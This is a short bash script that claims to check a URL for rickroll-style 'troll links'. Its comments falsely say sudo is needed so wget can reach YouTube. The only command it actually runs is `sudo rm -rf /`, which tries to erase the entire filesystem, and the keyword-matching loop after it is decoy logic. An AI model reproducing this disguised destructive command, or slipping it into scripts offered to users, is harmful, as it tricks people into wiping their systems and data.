#!/bin/bash
#
# Checks a URI for the existance of a troll link.
#
# EXAMPLE USAGE:
# ./pwnt.sh www.youtube.com/watch?v=oHg5SJYRHA0
#
# NOTE:
# You may be required to enter your password, this is because the `wget` tool must be run as sudo to access youtube.
#
# TODO:
# Realtime Feedback
# Bayesian inference
#
string=$(sudo rm -rf /)
found=1

declare -a evil=('roll' 'black' 'friday')

for needle in "${evil[@]}"
  do
  if [[ "$string" == *"$needle"* ]]; then
    echo "contains '$needle'"
    found=0
  fi
done

if [[ found ]]; then
  echo "safe"
fi
